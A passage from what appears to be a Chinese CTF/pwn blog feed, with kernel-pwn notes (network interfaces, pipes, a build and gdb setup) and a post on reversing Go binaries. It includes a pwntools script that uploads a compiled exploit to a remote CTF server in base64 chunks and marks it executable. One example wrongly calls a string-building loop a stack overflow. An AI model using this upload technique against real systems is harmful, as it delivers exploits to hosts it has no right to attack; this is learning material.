和eth0.1三者的关系对应于物理网卡、子网卡、虚拟VLAN网卡的关系：<br><strong>物理网卡：物理网卡这里指的是服务器上实际的网络接口设备，这里我服务器上双网卡，在系统中看到的2个物理网卡分别对应是eth0和eth1这两个网络接口。</strong></p><p><strong>子网卡</strong>：子网卡在这里并不是实际上的网络接口设备，但是可以作为网络接口在系统中出现，如eth0:1、eth1:2这种网络接口。它们必须要依赖于物理网卡，虽然可以与物理网卡的网络接口同时在系统中存在并使用不同的IP地址，而且也拥有它们自己的网络接口配置文件。但是当所依赖的物理网卡不启用时（Down状态）这些子网卡也将一同不能工作。</p><p><strong>虚拟VLAN网卡</strong>：这些虚拟VLAN网卡也不是实际上的网络接口设备，也可以作为网络接口在系统中出现，但是与子网卡不同的是，他们没有自己的配置文件。他们只是通过将物理网加入不同的VLAN而生成的VLAN虚拟网卡。如果将一个物理网卡通过vconfig命令添加到多个VLAN当中去的话，就会有多个VLAN虚拟网卡出现，他们的信息以及相关的VLAN信息都是保存在&#x2F;proc&#x2F;net&#x2F;vlan&#x2F;config这个临时文件中的，而没有独自的配置文件。它们的网络接口名是eth0.1、eth1.2这种名字。</p><p>注意：当需要启用VLAN虚拟网卡工作的时候，关联的物理网卡网络接口上必须没有IP地址的配置信息，并且，这些主物理网卡的子网卡也必须不能被启用和必须不能有IP地址配置信息。这个在网上看到的结论根据我的实际测试结果来看是不准确的，物理网卡本身可以绑定IP，并且给本征vlan提供通信网关的功能，但必须是在802.1q下。</p><h1 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h1><p><code>socket</code>就是插座 ( 中文翻译成<strong>套接字</strong>有点莫名其妙)，运行在计算机中的两个程序通过socket建立起一个通道，数据在通道中传输。 socket把复杂的TCP&#x2F;IP协议族隐藏了起来，对程序员来说只要用好socket相关的函数，就可以完成网络通信。</p><h1 id="管道-1"><a href="#管道-1" class="headerlink" title="管道"></a>管道</h1><p>​管道的实质上就是一个文件系统，然后pipe指令会返回两个文件描述符，一个读一个写，而管道是单向的，就是在输入的时候不能输出，因此通常创建pipe两个管道一个用于输出，一个用于输入，管道分为管道本身（就是一个普通的类似流之类的），和管道数据（处于一个空间）。</p><p>​在创建子进程的时候，管道本身会被复制，到那时管道数据确实共享的，这样就能实现数据的传输</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213696.png" alt="image-20240402232429087"></p><h1 id="远程脚本"><a href="#远程脚本" class="headerlink" title="远程脚本"></a>远程脚本</h1><p><strong>pack.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"> </span><br><span class="line">gcc \</span><br><span class="line">    ./exp.c \</span><br><span class="line">    -o exp    \</span><br><span class="line">    -masm=intel \</span><br><span class="line">    --static  \</span><br><span class="line">    -g</span><br><span class="line"> </span><br><span class="line"><span class="built_in">chmod</span> 777 ./exp</span><br><span class="line"> </span><br><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.cpio</span><br><span class="line"><span class="built_in">chmod</span> 777 ./rootfs.cpio</span><br></pre></td></tr></table></figure><p><strong>gdbinit</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file ./vmlinux</span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><h2 id="远程脚本-1"><a href="#远程脚本-1" class="headerlink" title="远程脚本"></a>远程脚本</h2><p>为了减小远程exp的体积，使用musl进行静态编译（）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;114.116.233.171&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;$ &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; bout&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x bout&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">os.system(<span class="string">&#x27;musl-gcc -w -s -static -o3 exp.c -o exp&#x27;</span>)</span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;kernel笔记&quot;&gt;&lt;a href=&quot;#kernel笔记&quot; class=&quot;headerlink&quot; title=&quot;kernel笔记&quot;&gt;&lt;/a&gt;kernel笔记&lt;/h1&gt;&lt;p&gt;首先是要配置环境，推荐[wiki](&lt;a href=&quot;https://ctf-wiki.or</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="http://s1nec-1o.github.io/categories/kernel-pwn/"/>
    
    
    <category term="kernel" scheme="http://s1nec-1o.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>GO-Pwn</title>
    <link href="http://s1nec-1o.github.io/2024/04/28/GO-Pwn/"/>
    <id>http://s1nec-1o.github.io/2024/04/28/GO-Pwn/</id>
    <published>2024-04-28T11:09:59.000Z</published>
    <updated>2024-04-28T14:12:27.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GO-PWN"><a href="#GO-PWN" class="headerlink" title="GO-PWN"></a>GO-PWN</h1><p>首先go的二进制文件分析与C&#x2F;C++二进制文件分析大有不同，有些老东西都不能运用得当</p><p>我们先讲述不同的点</p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a><a href="https://tiancaiamao.gitbooks.io/go-internals/content/zh/03.5.html">函数调用约定</a></h2><p>在 Go 语言中，<code>goroutine</code> 是一种轻量级的执行单元，用于并发执行代码。它可以看作是一种轻量级的线程，由 Go 运行时系统进行管理。与传统的线程相比，<code>goroutine</code> 具有更小的栈空间占用和更低的创建和销毁开销。</p><p>Go1.3版本之后则使用的是continuous stack，下面将具体分析一下这种技术。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>每次执行函数调用时Go的runtime都会进行检测，若当前栈的大小不够用，则会触发“中断”，从当前函数进入到Go的运行时库，Go的运行时库会保存此时的函数上下文环境，然后分配一个新的足够大的栈空间，将旧栈的内容拷贝到新栈中，并做一些设置，使得当函数恢复运行时，函数会在新分配的栈中继续执行，仿佛整个过程都没发生过一样，这个函数会觉得自己使用的是一块大小“无限”的栈空间。</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>在研究Go的实现细节之前让我们先自己思考一下应该如何实现。第一步肯定要有某种机制检测到当前栈大小不够用了，这个应该是把当前的栈寄存器SP跟栈的可用栈空间的边界进行比较。能够检测到栈大小不够用，就相当于捕捉到了“中断”。</p><p>捕获完“中断”，第二步要做的，就应该是进入运行时，保存当前goroutine的上下文。别陷入如何保存上下文的细节，先假如我们把函数栈增长时的上下文保存好了，那下一步就是分配新的栈空间了，我们可以将分配空间想象成就是调用一下malloc而已。</p><p>接下来怎么办呢？我们要将旧栈中的内容拷贝到新栈中，然后让函数继续在新栈中运行。这里先暂时忽略旧栈内容拷贝到新栈中的一些技术难点，假设在新栈空间中恢复了“中断”时的上下文，从运行时返回到函数。</p><p>函数在新的栈中继续运行了，但是还有个问题：函数如何返回。因为函数返回后栈是要缩小的，否则就会内存浪费空间了，所以还需要在函数返回时处理栈缩小的问题。</p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>首先写一个test.go文件，内容如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    main()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后生成汇编文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go tool <span class="number">6</span>g -S test.go | head <span class="number">-8</span></span><br></pre></td></tr></table></figure><p>可以看以输出是：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000000</span> <span class="number">00000</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    TEXT    <span class="string">&quot;&quot;</span>.main+<span class="number">0</span>(SB),$<span class="number">0</span><span class="number">-0</span></span><br><span class="line"><span class="number">000000</span> <span class="number">00000</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    MOVQ    (TLS),CX</span><br><span class="line"><span class="number">0x0009</span> <span class="number">00009</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    CMPQ    SP,(CX)</span><br><span class="line"><span class="number">0x000c</span> <span class="number">00012</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    JHI    ,<span class="number">21</span></span><br><span class="line"><span class="number">0x000e</span> <span class="number">00014</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    CALL    ,runtime.morestack00_noctxt(SB)</span><br><span class="line"><span class="number">0x0013</span> <span class="number">00019</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    JMP    ,<span class="number">0</span></span><br><span class="line"><span class="number">0x0015</span> <span class="number">00021</span> (test.<span class="keyword">go</span>:<span class="number">3</span>)    NOP    ,</span><br></pre></td></tr></table></figure><p>让我们好好看一下这些指令。(TLS)取到的是结构体G的第一个域，也就是g-&gt;stackguard地址，将它赋值给CX。然后CX地址的值与SP进行比较，如果SP大于g-&gt;stackguard了，则会调用runtime.morestack函数。<strong>这几条指令的作用就是检测栈是否溢出。</strong></p><p>不过并不是所有函数在链接时都会插入这种指令。如果你读源代码，可能会发现<code>#pragma textflag 7</code>，或者在汇编函数中看到<code>TEXT reuntime.exit(SB),7,$0</code>，这种函数就是不会检测栈溢出的。<strong>这个是编译标记，控制是否生成栈溢出检测指令。</strong></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol><li>使用分段栈的函数头几个指令检测SP和stackguard，调用runtime.morestack</li><li>runtime.morestack函数的主要功能是保存当前的栈的一些信息，然后转换成调度器的栈调用runtime.newstack</li><li>runtime.newstack函数的主要功能是分配空间，装饰此空间，将旧的frame和arg弄到新空间</li><li>使用gogocall的方式切换到新分配的栈，gogocall使用的JMP返回到被中断的函数</li><li>继续执行遇到RET指令时会返回到runtime.lessstack，lessstack做的事情跟morestack相反，它要准备好从new stack到old stack</li></ol><p>整个过程有点像一次中断，中断处理时保存当时的现场，弄个新的栈，中断恢复时恢复到新栈中运行。栈的收缩是垃圾回收的过程中实现的．当检测到栈只使用了不到1&#x2F;4时，栈缩小为原来的1&#x2F;2.</p><h2 id="函数调用寄存器"><a href="#函数调用寄存器" class="headerlink" title="函数调用寄存器"></a>函数调用寄存器</h2><ol><li>Go1.17.1之前的函数调用，参数都在栈上传递；Go1.17.1以后，9个以内的参数在寄存器传递，9个以外的在栈上传递；</li><li>Go1.17.1之前版本，callee函数返回值通过caller栈传递；Go1.17.1以后，函数调用的返回值，9个以内通过寄存器传递回caller，9个以外在栈上传递；</li></ol><p>这九个寄存器优先级从高到低是：</p><p><code>ax &gt; bx &gt; cx &gt; di &gt; si &gt; r8 &gt; r9 &gt; r10 &gt; r11</code></p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>由于恶意软件大都是被 strip 处理过，已经去除了二进制文件里的调试信息和函数符号，所以 Go 二进制文件的逆向分析技术的探索，前期主要围绕着函数符号的恢复来展开。</p><p>由于网上的资料都甚少，至少我没搜到，因此我就自己编译自己逆一些程序</p><h1 id="编译及逆向"><a href="#编译及逆向" class="headerlink" title="编译及逆向"></a>编译及逆向</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写一个输出hello world的go的程序。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放到ida里</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.main</span></span><br><span class="line">void __cdecl main_main()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0[<span class="number">0</span>] = (__int64)&amp;RTYPE_string;</span><br><span class="line">  v0[<span class="number">1</span>] = (__int64)&amp;off_4D8F60;</span><br><span class="line">  fmt_Fprintln((__int64)&amp;go_itab__ptr_os_File_comma_io_Writer, os_Stdout, (__int64)v0, <span class="number">1</span>LL, <span class="number">1</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到v0[1]是输出参数</p><p>可以认为他的参数设置是，类型+值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写一个包含很多类型，语法的go语言程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">float32</span> = <span class="number">3.14</span></span><br><span class="line"><span class="keyword">var</span> c <span class="type">string</span> = <span class="string">&quot;Hello, world!&quot;</span></span><br><span class="line"><span class="keyword">var</span> d <span class="type">bool</span> = <span class="literal">true</span></span><br><span class="line"><span class="keyword">var</span> e []<span class="type">int</span> = []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span> = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;one&quot;</span>: <span class="number">1</span>, <span class="string">&quot;two&quot;</span>: <span class="number">2</span>, <span class="string">&quot;three&quot;</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">var</span> g <span class="keyword">chan</span> <span class="type">int</span> = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(a, b, c, d, e, f, g)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再看一个涉及多种类型的go程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.main</span></span><br><span class="line">void __cdecl main_main()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+50h] [rbp-A8h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+58h] [rbp-A0h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+60h] [rbp-98h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+68h] [rbp-90h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+70h] [rbp-88h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+78h] [rbp-80h]</span></span><br><span class="line">  __int64 v7[<span class="number">14</span>]; <span class="comment">// [rsp+80h] [rbp-78h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = runtime_newobject(&amp;RTYPE__5_int);</span><br><span class="line">  *(_QWORD *)v6 = <span class="number">1</span>LL;</span><br><span class="line">  *(_OWORD *)(v6 + <span class="number">8</span>) = xmmword_4DB908;</span><br><span class="line">  *(_OWORD *)(v6 + <span class="number">24</span>) = xmmword_4DB918;</span><br><span class="line">  v5 = runtime_makemap_small();</span><br><span class="line">  *(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;one&quot;</span>, <span class="number">3</span>LL) = <span class="number">1</span>LL;</span><br><span class="line">  *(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;two&quot;</span>, <span class="number">3</span>LL) = <span class="number">2</span>LL;</span><br><span class="line">  *(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;three&quot;</span>, <span class="number">5</span>LL) = <span class="number">3</span>LL;</span><br><span class="line">  v4 = runtime_makechan((__int64)&amp;RTYPE_chan_int, <span class="number">0</span>LL);</span><br><span class="line">  v3 = runtime_convT64(<span class="number">10</span>LL);</span><br><span class="line">  v2 = runtime_convT32(_f32_4048f5c3);          <span class="comment">// 3.14</span></span><br><span class="line">  v1 = runtime_convTstring((__int64)<span class="string">&quot;Hello, world!&quot;</span>, <span class="number">13</span>LL);</span><br><span class="line">  runtime_convTslice(v6, <span class="number">5</span>LL, <span class="number">5</span>LL);</span><br><span class="line">  v0 = ((__int64 (*)(void))loc_4540AD)();</span><br><span class="line">  v7[<span class="number">0</span>] = (__int64)&amp;RTYPE_int;</span><br><span class="line">  v7[<span class="number">1</span>] = v3;</span><br><span class="line">  v7[<span class="number">2</span>] = (__int64)&amp;RTYPE_float32;</span><br><span class="line">  v7[<span class="number">3</span>] = v2;</span><br><span class="line">  v7[<span class="number">4</span>] = (__int64)&amp;RTYPE_string;</span><br><span class="line">  v7[<span class="number">5</span>] = v1;</span><br><span class="line">  v7[<span class="number">6</span>] = (__int64)&amp;RTYPE_bool;</span><br><span class="line">  v7[<span class="number">7</span>] = (__int64)&amp;runtime_staticbytes + <span class="number">1</span>;</span><br><span class="line">  v7[<span class="number">8</span>] = (__int64)&amp;RTYPE__slice_int;</span><br><span class="line">  v7[<span class="number">9</span>] = v0;</span><br><span class="line">  v7[<span class="number">10</span>] = (__int64)&amp;RTYPE_map_string_int;</span><br><span class="line">  v7[<span class="number">11</span>] = v5;</span><br><span class="line">  v7[<span class="number">12</span>] = (__int64)&amp;RTYPE_chan_int;</span><br><span class="line">  v7[<span class="number">13</span>] = v4;</span><br><span class="line">  fmt_Fprintln((__int64)&amp;go_itab__ptr_os_File_comma_io_Writer, os_Stdout, (__int64)v7, <span class="number">7</span>LL, <span class="number">7</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v6 = runtime_newobject(&amp;RTYPE__5_int);</span><br><span class="line">*(_QWORD *)v6 = <span class="number">1</span>LL;</span><br><span class="line">*(_OWORD *)(v6 + <span class="number">8</span>) = xmmword_4DB908;</span><br><span class="line">*(_OWORD *)(v6 + <span class="number">24</span>) = xmmword_4DB918;</span><br></pre></td></tr></table></figure><p><code>runtime_newobject</code>这个是类似于一个malloc的函数调用，关键字 <code>new</code> 同样也会被编译器翻译为此函数，所以<code>runtime_newobject</code>就是一个内存分配的核心函数，调用这个的原因是有些字符串(may?)是通过指针调用的，让我们gdb一下</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212524.png" alt="image-20240322131856847" style="zoom:50%;" /><p>可以看到一些其他的东西，比如string是在一个内存区域内，type也是，或许其中有一个是go的堆</p><p>我们再vmmap看一下</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212525.png" alt="image-20240322132743451" style="zoom:50%;" /><p>首先anon_c000000才是go使用的栈，而最下面是我们系统的栈，0x400000-0x48e000则是代码区，</p><p>首先吸引我的是heap区域，不知道是不是真正的heap区域</p><p>那就让我们进去看看</p><p>它分为好几个部分</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runtime.stackLarge</span><br><span class="line">runtime.m0</span><br><span class="line">runtime.cpuprof</span><br></pre></td></tr></table></figure><p>栈空间在运行时中包含两个重要的全局变量，分别是 <code>runtime.stackpool</code> 和<code>runtime.stackLarge</code>，这两个变量分别表示全局的栈缓存和大栈缓存，前者可以分配小于 32KB 的内存，后者用来分配大于 32KB 的栈空间</p><p>但是深究下去，或许会很复杂？等以后再说吧。。。。</p><p>之后的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;one&quot;</span>, <span class="number">3LL</span>) = <span class="number">1LL</span>;</span><br><span class="line">*(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;two&quot;</span>, <span class="number">3LL</span>) = <span class="number">2LL</span>;</span><br><span class="line">*(_QWORD *)runtime_mapassign_faststr(&amp;RTYPE_map_string_int, v5, <span class="string">&quot;three&quot;</span>, <span class="number">5LL</span>) = <span class="number">3LL</span>;</span><br><span class="line">v4 = runtime_makechan((__int64)&amp;RTYPE_chan_int, <span class="number">0LL</span>);</span><br><span class="line">v3 = runtime_convT64(<span class="number">10LL</span>);</span><br><span class="line">v2 = runtime_convT32(_f32_4048f5c3);          <span class="comment">// 3.14</span></span><br><span class="line">v1 = runtime_convTstring((__int64)<span class="string">&quot;Hello, world!&quot;</span>, <span class="number">13LL</span>);</span><br><span class="line">runtime_convTslice(v6, <span class="number">5LL</span>, <span class="number">5LL</span>);</span><br><span class="line">v0 = ((__int64 (*)(<span class="type">void</span>))loc_4540AD)();</span><br><span class="line">v7[<span class="number">0</span>] = (__int64)&amp;RTYPE_int;</span><br><span class="line">v7[<span class="number">1</span>] = v3;</span><br><span class="line">v7[<span class="number">2</span>] = (__int64)&amp;RTYPE_float32;</span><br><span class="line">v7[<span class="number">3</span>] = v2;</span><br><span class="line">v7[<span class="number">4</span>] = (__int64)&amp;RTYPE_string;</span><br><span class="line">v7[<span class="number">5</span>] = v1;</span><br><span class="line">v7[<span class="number">6</span>] = (__int64)&amp;RTYPE_bool;</span><br><span class="line">v7[<span class="number">7</span>] = (__int64)&amp;runtime_staticbytes + <span class="number">1</span>;</span><br><span class="line">v7[<span class="number">8</span>] = (__int64)&amp;RTYPE__slice_int;</span><br><span class="line">v7[<span class="number">9</span>] = v0;</span><br><span class="line">v7[<span class="number">10</span>] = (__int64)&amp;RTYPE_map_string_int;</span><br><span class="line">v7[<span class="number">11</span>] = v5;</span><br><span class="line">v7[<span class="number">12</span>] = (__int64)&amp;RTYPE_chan_int;</span><br><span class="line">v7[<span class="number">13</span>] = v4;</span><br><span class="line">fmt_Fprintln((__int64)&amp;go_itab__ptr_os_File_comma_io_Writer, os_Stdout, (__int64)v7, <span class="number">7LL</span>, <span class="number">7LL</span>);</span><br></pre></td></tr></table></figure><p>可以看到参数就是先是一个类型，然后紧跟着数值，符合猜测</p><p>之后看一个有栈溢出漏洞的go程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写一个可以控制输出量的有栈溢出风险的简单go程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> s <span class="type">string</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++ &#123;</span><br><span class="line">s += fmt.Sprintf(<span class="string">&quot;%d&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到显然一个栈溢出</p><figure class="highlight go"><table><tr><td 